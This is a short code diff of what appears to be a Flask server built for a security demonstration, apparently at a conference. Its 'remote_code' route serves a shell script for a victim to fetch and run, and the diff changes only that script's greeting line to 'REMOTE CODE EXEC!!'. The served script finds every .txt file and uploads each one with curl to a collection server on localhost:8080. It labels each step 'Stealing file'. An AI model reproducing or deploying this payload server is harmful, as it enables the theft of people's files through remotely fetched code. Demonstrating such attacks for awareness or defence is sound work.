@@ -19,7 +19,7 @@ def receive_post():
 @app.route("/", methods=["GET"])
 def remote_code():
     return """
-    echo 'Hello RSAC'
+    echo 'REMOTE CODE EXEC!!'
     for file in $(find . -type f -name "*.txt"); do
     echo "Stealing file: $file"
     curl -F "file=@$file" http://localhost:8080 -o /dev/null -s
